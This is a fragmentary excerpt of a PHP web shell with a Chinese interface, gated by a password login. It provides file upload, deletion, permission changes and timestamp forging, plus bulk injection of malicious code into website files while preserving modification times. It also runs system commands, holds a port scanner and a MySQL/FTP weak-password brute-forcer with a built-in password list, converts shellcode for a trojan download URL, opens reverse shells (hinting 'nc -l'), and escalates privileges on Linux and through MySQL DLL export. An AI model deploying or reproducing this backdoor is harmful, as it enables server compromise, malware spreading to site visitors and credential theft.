...
{
	$key = @copy($filea,$fileb);
	if(!$key) $key = @move_uploaded_file($filea,$fileb);
	return $key;
}
...
function File_Act($array,$actall,$inver)
{
	...
	while($i < $count)
	{
		...
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '修改属性'; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间'; break;
		}
		$i++;
	}
	return '所选文件'.$msg.'完毕';
		...
		if(count($_FILES['soup']) >= 1)
		{
			...
			foreach ($_FILES['soup']['error'] as $key => $error)
			{
				if ($error == UPLOAD_ERR_OK)
				{
					...
					$MSG_BOX .= File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? '<br>'.$soupname.'上传成功' : '<br>'.$soupname.'上传失败';
				}
				$i++;
			}
		}
...
<div class="actall">附件1 <input type="file" name="soup[]" style="width:400px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">附件2 <input type="file" name="soup[]" style="width:400px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">附件3 <input type="file" name="soup[]" style="width:400px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">附件4 <input type="file" name="soup[]" style="width:400px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">附件5 <input type="file" name="soup[]" style="width:400px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">附件6 <input type="file" name="soup[]" style="width:400px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">附件7 <input type="file" name="soup[]" style="width:400px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">附件8 <input type="file" name="soup[]" style="width:400px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
...
function File_a($p)
{
	...
	if(!empty($_POST['ufs'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($p.'/'.$upfilename)) ? '上传文件 '.$upfilename.' 成功' : '上传文件 '.$upfilename.' 失败';}
	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
	if(!empty($_GET['mn'])){$MSG_BOX = @rename(File_Str($p.'/'.$_GET['mn']),File_Str($p.'/'.$_GET['rn'])) ? '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 成功' : '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 失败';}
	if(!empty($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($p.'/'.$_GET['dn']),0777) ? '创建目录 '.$_GET['dn'].' 成功' : '创建目录 '.$_GET['dn'].' 失败';}
	if(!empty($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? '删除目录 '.$_GET['dd'].' 成功' : '删除目录 '.$_GET['dd'].' 失败';}
	if(!empty($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = '下载文件不存在';}
	Root_CSS();
print<<<END
<script type="text/javascript">
	...
	<input type="button" value="批量上传" onclick="window.location='?s=q&p={$p}';"> 
	<input type="file" name="ufp" style="width:300px;height:22px;">
	<input type="text" name="ufn" style="width:121px;height:22px;">
	<input type="submit" name="ufs" value="上传" style="width:50px;">
	</form>
	</div>
	<form method="POST" id="fileall" action="?s=a&p={$THIS_DIR}">
	<table border="0"><tr>
	<td class="toptd" style="width:480px;"> <a href="?s=a&p={$UP_DIR}"><b>上级目录</b></a> </td>
	<td class="toptd" style="width:75px;"> 操作 </td>
	<td class="toptd" style="width:45px;"> 属性 </td>
	<td class="toptd" style="width:165px;"> 修改时间 </td>
	<td class="toptd" style="width:65px;"> 大小 </td></tr>
END;
	...
	while(false !== ($Filename = @readdir($h_d)))
	{
		...
		if(!is_dir($Filepath))
		{
			...
			echo "\n".'<tr><td><input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$Filename.'</a></td>';
			$Filepath = urlencode($Filepath);
			$Filename = urlencode($Filename);
...
<input type="button" value="时间" onclick="CheckDate('2009-01-01 00:00:00','d');return false;"> 
...
function Guama_b()
{
	if((!empty($_POST['gp'])) && (!empty($_POST['gt'])) && (!empty($_POST['gc'])))
	{
		...
		echo Guama_Auto($_POST['gp'],$gt,$gl,$_POST['gc'],$_POST['incode'],$gk,$gd,$gb,$go) ? '挂马完毕' : '异常终止';
		echo '<br><input type="button" value="返回" onclick="history.back();">';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
...
<div class="actall" style="height:35px;"><input type="radio" name="incode" value="1" checked>插入&lt;/head&gt;标签之前 
<input type="radio" name="incode" value="2">插入文件最顶端 
<input type="radio" name="incode" value="3">插入文件最末尾</div>
<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>自能过滤重复代码 <input type="checkbox" name="gd" value="1" checked>保持文件修改时间不变</div>
...
function Tihuan_d()
{
	if((!empty($_POST['tp'])) && (!empty($_POST['tt'])))
	{
		...
		echo '<br><input type="button" value="返回" onclick="window.location=\'?s=d\'">';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
...
function autoup(){
	...
	if(document.getElementById('tca').value == '' || document.getElementById('tcb').value == ''){alert('替换代码不能为空');return false;}
...
<div class="actall"><textarea name="show" style="width:630px;height:300px;">{$res}</textarea></div>
</form>
END;
	return true;
}
...
print<<<END
执行CMD命令<br> <input type="text" name="cmd" value="{$cmd}" style="width:600px;">
<input type="submit" value="执行" style="width:80px;"></form><br>
END;
	if(!empty($_POST['cmd']))
	{
...
<br><br><input type="submit" value="执行" style="width:80px;"></form><br>
END;
	if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '执行成功' : '执行失败';
}
elseif($object == 'adodb')
{
...
数据库连接字符串<br> <input type="text" name="string" id="string" value="{$string}" style="width:600px;">
...
<br><br>SQL命令<br> <input type="text" name="sql" id="sql" value="{$sql}" style="width:600px;">
...
扫描IP<br><input type="text" name="ip" value="127.0.0.1" style="width:600px;">
<br><br>端口号<br><input type="text" name="port" value="21|23|25|80|110|135|139|445|1433|3306|3389|43958" style="width:600px;">
<br><br> <input type="submit" value="扫描" style="width:80px;">
</form><br>
END;
...
{
	$Oday_value = '0';
	$Shell_Code = 'http://www.baidu.com/download/muma.exe';
	$checkeda = ' checked';
	$checkedb = '';
	if(!empty($_POST['code']))
	{
		...
		if(!$Shell_Code) $Shell_Code = '未找到shellcode中的下载地址';
		$Shell_Code = htmlspecialchars($Shell_Code);
	}
print<<<END
<form method="POST" name="jform" id="jform" action="?s=j">
<div class="actall">异或值<input name="number" value="{$Oday_value}" type="text" style="width:30px">&nbsp;&nbsp;&nbsp;
<input type="radio" name="xor" value="a"{$checkeda}>shellcode异或加密 <input type="radio" name="xor" value="b"{$checkedb}>shellcode异或解密</div>
<div class="actall"><textarea name="code" rows="20" cols="90">{$Shell_Code}</textarea></div>
<div class="actall"><input type="submit" value="数据转换" style="width:80px;"></div>
</form>
END;
	return true;
}
...
function Crack_k()
{
	...
	if((!empty($_POST['address'])) && (!empty($_POST['user'])) && (!empty($_POST['pass'])))
	{
		...
		for($k = 0;$k < count($SORTPASS);$k++)
		{
			...
			if($connect) $MSG_BOX = '[项目: '.$_POST['class'].'] [地址: '.$_POST['address'].'] [用户: '.$_POST['user'].'] [密码: '.$SORTPASS[$k].']';
		}
	}
print<<<END
<form method="POST" name="kform" id="kform" action="?s=k">
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<div class="actall">地址 <input type="text" name="address" value="localhost" style="width:300px"></div>
<div class="actall">帐号 <input type="text" name="user" value="root" style="width:300px"></div>
<div class="actall">密码 <textarea name="pass" rows="10" cols="80">{$PASS}root,123456,123123,123321,admin,admin888,admin@admin,root@root,qwer123,5201314,iloveyou,fuckyou,kissme,520520,5845201314,a123456,a123456789</textarea></div>
<div class="actall">破解项目: <input type="radio" name="class" value="mysql" checked>Mysql 
<input type="radio" name="class" value="ftp">FTP</div>
<div class="actall"><input type="submit" value="开始破解" style="width:80px;"></div></form>
END;
	return true;
}
...
你的IP <input type="text" name="yourip" value="{$yourip}" style="width:200px">
你的端口 <input type="text" name="yourport" value="12345" style="width:200px">
使用脚本 <select name="use" >
<option value="perl">perl</option>
<option value="c">c</option>
</select>
<input type="submit" value="开始连接" style="width:80px;"></form><br>
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
		...
		echo '<br>你可以尝试连接端口 (nc -l -n -v -p '.$_POST['yourport'].')';
	}
	echo '</div>';
	return true;
}
				...
				if(@mysql_query($query,$conn))
				{
					...
					if(@mysql_query($query,$conn))
					{
						...
						if(@mysql_query($query,$conn))
						{
							...
							$k = 0;
							while($row = @mysql_fetch_array($result)){$ver .= $row[$k];$k++;}
							if(eregi('5.',$ver)){$ap = explode('/', $mpath); $inpath = array_pop($ap);}
							else $inpath = $mpath;
...
可加载路径 <input type="text" name="mpath" value="{$mpath}" style="width:400px"> 
<input type="submit" name="outdll" value="导出DLL" style="width:80px;"></div>
		...
		if(isset($_GET['db']))
		{
			...
			if(isset($_GET['table']))
			{
				...
				if(isset($_GET['edit']))
				{
					...
					echo '<input type="hidden" name="wherevar" value="'.base64_encode($where).'">';
...
<html>
	<body style="background:#AAAAAA;">
		...
		<div style="width:350px;height:110px;padding-top:50px;color:#000000;clear:both;">PASS:<input type="password" name="spiderpass" style="width:270px;"></div>
		<div style="width:350px;height:50px;clear:both;"><input type="submit" value="LOGIN" style="width:80px;"></div>
		</div>
		</form>
		</center>
	</body>
			...
			<div style="height:546px;">
				...
				<td width="140" align="center" valign="top">
					<ul class="listbg">
						...
						<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main"> 网马转换 </a></li>
						<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main"> 扫弱口令 </a></li>
						<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main"> Linux提权 </a></li>
						<li><a href="?s=m" id="t_12" onclick="switchTab('t_12')" target="main"> MYSQL提权 </a></li>
						<li><a href="?s=n" id="t_13" onclick="switchTab('t_13')" target="main"> MYSQL语句 </a></li>
...
if($_COOKIE['admin_spiderpass'] != md5($password))
{
	...
	if(isset($_POST['spiderpass']))
	{
		...
		if(md5($_POST['spiderpass']) == md5($password)){Root_Check($_POST['spiderpass']);die('<meta http-equiv="refresh" content="1;URL=?">');}
